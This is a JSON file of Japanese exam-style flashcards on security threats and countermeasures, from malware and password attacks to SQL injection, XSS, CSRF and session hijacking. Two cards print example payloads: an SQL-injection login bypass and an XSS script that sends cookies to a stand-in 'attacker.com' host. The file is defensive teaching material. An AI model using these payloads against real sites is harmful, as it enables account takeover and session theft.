{
  "topicId": "tech-3-5-2",
  "title": "脅威と対策",
  "flashcards": [
    {
      "id": "tech-3-5-2-fc-1",
      "front": "ウイルス、ワーム、トロイの木馬の違いは？",
      "back": "【ウイルス】\n他のプログラムに寄生し、自己増殖する。宿主プログラムが実行されると活動開始。ユーザーの操作が必要。\n例: マクロウイルス（Wordファイルに感染）\n\n【ワーム】\n単独で存在し、ネットワーク経由で自動的に拡散する。ユーザーの操作不要で、脆弱性を突いて自動的に感染・拡散。\n例: WannaCry（Windows脆弱性を悪用）\n\n【トロイの木馬】\n正規のプログラムに偽装して侵入。自己増殖しない。バックドア（裏口）を作成し、遠隔操作を可能にする。\n例: 偽セキュリティソフト\n\n重要: ワームは最も危険（自動拡散で被害が急速に広がる）、トロイの木馬は検知が困難（正規ソフトに偽装）。",
      "importance": 5
    },
    {
      "id": "tech-3-5-2-fc-2",
      "front": "ランサムウェアとは？被害を防ぐ最重要対策は？",
      "back": "【ランサムウェア】\nファイルを暗号化し、復号と引き換えに身代金（Ransom）を要求するマルウェア。\n\n【被害】\n①全てのファイルが暗号化され、アクセス不可 → 業務完全停止\n②バックアップも暗号化されると復元不可\n③身代金を支払っても復号鍵がもらえる保証なし\n\n【最重要対策：オフラインバックアップ】\n①ネットワークから切り離した外付けHDD、テープメディアにバックアップ\n②クラウドの世代管理バックアップ（過去の状態に戻せる）\n③定期的に復元訓練を実施\n\nその他の対策:\n①セキュリティパッチを適用\n②メールの添付ファイルを開く前に送信者に確認\n③ネットワークのセグメント化",
      "importance": 5
    },
    {
      "id": "tech-3-5-2-fc-3",
      "front": "スパイウェアの種類と対策は？",
      "back": "【キーロガー】\nキーボードの入力内容を記録し、外部に送信。パスワード、クレジットカード番号を窃取。\n\n【アドウェア】\n広告を勝手に表示。ユーザーの閲覧履歴を収集し、ターゲット広告を表示。\n\n【スクリーンキャプチャ型】\n画面のスクリーンショットを定期的に撮影し、外部に送信。\n\n【対策】\n①信頼できないソフトウェアはインストールしない（公式サイトからのみダウンロード）\n②ウイルス対策ソフトで定期的にスキャン\n③重要なパスワード入力時は、ソフトウェアキーボード（画面上のキーボード）を使用\n④多要素認証を有効化（パスワードが盗まれても、ワンタイムパスワードで保護）",
      "importance": 4
    },
    {
      "id": "tech-3-5-2-fc-4",
      "front": "総当たり攻撃、辞書攻撃、パスワードリスト攻撃の違いは？",
      "back": "【総当たり攻撃（ブルートフォース攻撃）】\n全ての文字の組み合わせを順番に試す。\n例: aaaa → aaab → aaac...\n時間がかかるが、いずれ解読可能。\n\n【辞書攻撃】\nよく使われる単語のリスト（辞書）を使って試す。\n例: password、123456、admin、yamada\n総当たり攻撃より高速。\n\n【パスワードリスト攻撃】\n他サイトから流出したID・パスワードのリストを使って試す。\n多くのユーザーが複数サイトで同じパスワードを使い回しているため、成功率が高い。\n\n【対策】\n総当たり・辞書攻撃: 複雑なパスワード（8文字以上、英数字記号混在）、アカウントロック\nパスワードリスト攻撃: サイトごとに異なるパスワードを使用、多要素認証",
      "importance": 5
    },
    {
      "id": "tech-3-5-2-fc-5",
      "front": "ソーシャルエンジニアリングの代表的な手法と対策は？",
      "back": "【なりすまし電話】\nIT部を装って電話し、「システムのメンテナンスのため、パスワードを教えてください」と要求。\n\n【トラッシング（ゴミ箱漁り）】\n企業のゴミ箱から、捨てられた書類（社員名、電話番号、システム名）を回収し、情報収集。\n\n【テイルゲーティング（共連れ）】\n宅配業者を装い、社員がドアを開けた際に一緒に入室。\n\n【ショルダーハッキング】\n後ろから覗き見して、パスワード入力を盗み見る。\n\n【対策】\n①従業員教育: 電話でパスワードを聞かれても絶対に教えない\n②書類のシュレッダー処理\n③入退室管理: ICカード認証、防犯カメラ\n④パスワード入力時は周囲を確認",
      "importance": 5
    },
    {
      "id": "tech-3-5-2-fc-6",
      "front": "DoS攻撃とDDoS攻撃の違いは？対策は？",
      "back": "【DoS攻撃（Denial of Service）】\n1台のPCから、サーバに大量のアクセス（リクエスト）を送信し、サービスを停止させる。\n例: SYN Flood攻撃（大量のSYNパケットを送信し、サーバのメモリを消費）\n\n【DDoS攻撃（Distributed DoS）】\n複数のPC（ボットネット）から同時にDoS攻撃を実行。\n例: 10万台のボットが一斉にアクセス → サーバがダウン\nDoS攻撃より強力で、防御が困難。\n\n【対策】\n①ファイアウォールでSYN Floodを検知・遮断\n②CDN（Content Delivery Network）を利用（CloudflareなどのDDoS対策サービス）\n③帯域幅を増やす（ただし、大規模DDoS攻撃には限界あり）\n④IPS（侵入防止システム）で異常なトラフィックを遮断",
      "importance": 5
    },
    {
      "id": "tech-3-5-2-fc-7",
      "front": "標的型攻撃（APT）の特徴と対策は？",
      "back": "【特徴】\n①特定の組織（政府機関、大企業、研究機関）を狙う高度な攻撃\n②事前に標的を調査し、説得力のあるメールを作成（取引先を装う）\n③長期間（数ヶ月～数年）潜伏し、少しずつ機密情報を窃取\n④検知が非常に困難\n\n【攻撃の流れ】\n①標的の社員にフィッシングメール送信 → マルウェア感染\n②ネットワーク内を探索、管理者権限を奪取\n③機密情報（設計図、顧客リスト）を長期間にわたり窃取\n\n【対策】\n①従業員のセキュリティ教育（メール訓練）\n②メールセキュリティ（添付ファイルのサンドボックス解析）\n③ネットワーク監視（異常な通信の検知）\n④権限の最小化（社員には必要最小限の権限のみ）\n⑤ネットワークのセグメント化",
      "importance": 5
    },
    {
      "id": "tech-3-5-2-fc-8",
      "front": "ゼロデイ攻撃とは？対策は？",
      "back": "【ゼロデイ攻撃】\nソフトウェアの脆弱性が公開される前（パッチが提供される前）に、その脆弱性を悪用する攻撃。「ゼロデイ」は、脆弱性が公開されてから「0日」（まだ修正されていない）という意味。\n\n【危険性】\nパッチが存在しないため、全てのユーザーが危険にさらされる。攻撃者が脆弱性を独占している間は防御が困難。\n\n【対策】\n①使用していないソフトウェアはアンインストール（攻撃対象を減らす）\n②ソフトウェアを最新の状態に保つ（自動更新を有効化）\n③IDS/IPS（侵入検知・防止システム）で異常な通信を検知\n④仮想環境（サンドボックス）で不審なファイルを実行\n⑤重要なシステムはネットワークから隔離",
      "importance": 4
    },
    {
      "id": "tech-3-5-2-fc-9",
      "front": "SQLインジェクションとは？対策は？",
      "back": "【SQLインジェクション】\nWebアプリケーションのSQL文に不正な文字列を挿入し、データベースを不正に操作する攻撃。\n\n【攻撃例】\nユーザーID: `admin' --`\nパスワード: （何でもよい）\n\n生成されるSQL文:\n```sql\nSELECT * FROM users WHERE user_id = 'admin' --' AND password = 'anything'\n```\n`--`はコメント記号なので、パスワードチェックが無視され、管理者でログインできる。\n\n【被害】\n①管理者アカウントに不正ログイン\n②全ユーザーの情報が漏洩\n③データベースの全データが削除される\n\n【対策】\n①プレースホルダ（パラメータ化クエリ）を使用\n②入力値の検証（特殊文字をエスケープ）\n③WAF（Web Application Firewall）でSQLインジェクションを検知・遮断",
      "importance": 5
    },
    {
      "id": "tech-3-5-2-fc-10",
      "front": "XSS（クロスサイトスクリプティング）とは？対策は？",
      "back": "【XSS】\nWebページに悪意のあるスクリプト（JavaScript）を埋め込み、他のユーザーがそのページを閲覧した際にスクリプトを実行させる攻撃。\n\n【攻撃例】\n掲示板に以下の投稿:\n```html\n<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>\n```\n他のユーザーが掲示板を閲覧すると、スクリプトが実行され、クッキー（セッションID）が攻撃者のサーバに送信される。\n\n【被害】\n①セッションハイジャック（セッションIDを盗まれ、なりすましログイン）\n②フィッシングサイトへのリダイレクト\n\n【対策】\n①HTMLエスケープ（特殊文字を無害化、`<script>` → `&lt;script&gt;`）\n②Content Security Policy（CSP）を設定（インラインスクリプトを禁止）\n③HTTPOnlyフラグをクッキーに設定（JavaScriptからクッキーにアクセス不可）",
      "importance": 5
    },
    {
      "id": "tech-3-5-2-fc-11",
      "front": "CSRF（クロスサイトリクエストフォージェリ）とは？対策は？",
      "back": "【CSRF】\nユーザーがログイン中のサイトに対して、攻撃者が用意したリンクやフォームから、意図しない操作を実行させる攻撃。\n\n【攻撃例】\nユーザーが銀行サイトにログイン中、罠のページを開くと、自動的に送金フォームが送信される。銀行サイトは、ユーザーのクッキー（セッションID）を確認し、正規のリクエストと判断して送金を実行。\n\n【被害】\n①意図しない送金が実行される\n②パスワードが変更される\n③アカウント情報が書き換えられる\n\n【対策】\n①CSRFトークンを使用（各リクエストに一意のトークンを付与、攻撃者は知らないため不正リクエストは拒否）\n②SameSite属性をクッキーに設定（クロスサイトからのリクエストでクッキーを送信しない）\n③重要な操作には、パスワードの再入力を要求",
      "importance": 4
    },
    {
      "id": "tech-3-5-2-fc-12",
      "front": "セッションハイジャックとは？対策は？",
      "back": "【セッションハイジャック】\nユーザーのセッションID（ログイン状態を識別する情報）を盗み、そのユーザーになりすましてログインする攻撃。\n\n【セッションID窃取の手法】\n①XSS: 悪意のあるスクリプトでクッキー（セッションID）を盗む\n②ネットワーク盗聴: HTTP通信（暗号化なし）でセッションIDを盗聴\n③セッションID推測: セッションIDが予測可能な場合、推測して不正ログイン\n\n【被害】\n①ユーザーになりすましてログイン\n②個人情報の閲覧・変更\n③不正な操作（送金、商品購入）\n\n【対策】\n①HTTPS（SSL/TLS）を使用（通信を暗号化し、盗聴を防ぐ）\n②HTTPOnlyフラグをクッキーに設定（JavaScriptからクッキーにアクセス不可、XSS対策）\n③セッションIDをランダム生成（推測不可能にする）\n④ログイン後にセッションIDを再生成\n⑤セッションタイムアウトを設定（一定時間操作がないと自動ログアウト）",
      "importance": 4
    }
  ]
}
